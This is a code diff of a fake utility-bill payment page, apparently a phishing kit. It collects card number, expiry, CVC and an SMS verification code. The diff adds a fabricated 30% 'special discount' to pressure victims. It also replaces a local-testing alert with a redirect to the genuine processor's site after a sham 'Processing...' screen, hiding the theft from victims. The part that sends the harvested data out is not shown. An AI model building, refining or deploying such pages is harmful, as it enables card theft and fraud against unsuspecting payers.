@@ -14,6 +14,8 @@
         .step { display: none; }
         .step.active { display: block; }
         .amount-box { background: #f8f7ff; border: 1px solid #e0daff; border-radius: 15px; padding: 25px; margin: 20px 0; }
+        .old-price { font-size: 16px; color: #888; text-decoration: line-through; margin-bottom: 2px; }
+        .discount-badge { display: inline-block; background: #d9534f; color: #fff; font-size: 12px; font-weight: bold; padding: 2px 6px; border-radius: 4px; margin-bottom: 8px; }
         .amount { font-size: 40px; font-weight: 800; color: #5c46e5; }
         .form-group { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 13px; margin-bottom: 5px; font-weight: 600; color: #555; }
@@ -36,8 +38,10 @@
         <h2>Service Payment</h2>
         <p>Utility Bill: #8829-10</p>
         <div class="amount-box">
-            <div style="font-size: 12px; color: #666; margin-bottom: 5px;">TOTAL AMOUNT DUE</div>
-            <div class="amount">178.90€</div>
+            <div class="old-price">230.00€</div>
+            <div class="discount-badge">⚠️ SPECIAL DISCOUNT -30%</div>
+            <div style="font-size: 11px; color: #666; margin-bottom: 5px; font-weight: 600;">TOTAL AMOUNT DUE</div>
+            <div class="amount">161.00€</div>
         </div>
         <button onclick="nav(2)">Pay with Card</button>
     </div>
@@ -63,7 +67,7 @@
                 <input type="password" id="cvc" placeholder="123" maxlength="3">
             </div>
         </div>
-        <button onclick="sendData()">Pay 178.90€</button>
+        <button onclick="sendData()">Pay 161.00€</button>
         <p style="font-size: 13px; color: #999; margin-top: 15px; cursor: pointer;" onclick="nav(1)">← Back to bill</p>
     </div>
 
@@ -83,7 +87,6 @@
 </div>
 
 <script>
-// Переключение между шагами интерфейса
 function nav(n) {
     document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
     const targetStep = document.getElementById('step' + n);
@@ -92,22 +95,19 @@ function nav(n) {
     }
 }
 
-// Форматирование номера карты (разделение пробелами по 4 цифры)
+// Форматирование номера карты и даты
 document.getElementById('card').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
 });
-
-// Форматирование срока действия (добавление косой черты после 2 цифр)
 document.getElementById('exp').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
 });
 
-// Ограничение на ввод только цифр в поле проверочного кода
+// Ограничение ввода в поле кода (только цифры)
 document.getElementById('sms-code').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '');
 });
 
-// Логика перехода со второго шага на третий
 async function sendData() {
     const name = document.getElementById('name').value;
     const card = document.getElementById('card').value;
@@ -119,11 +119,9 @@ async function sendData() {
         return;
     }
 
-    // Переход на экран ввода проверочного кода
     nav(3);
 }
 
-// Логика завершения проверки кода
 function verifyCode() {
     const code = document.getElementById('sms-code').value;
 
@@ -132,12 +130,12 @@ function verifyCode() {
         return;
     }
 
-    // Изменение контента на финальный экран загрузки
+    // Показываем экран загрузки
     document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
 
-    // Локальный таймер окончания симуляции сессии
+    // Перенаправление на официальный сайт через 3 секунды
     setTimeout(() => {
-        alert('Локальное тестирование цепочки экранов успешно завершено.');
+        window.location.href = "jccsmart.com";
     }, 3000);
 }
 </script>
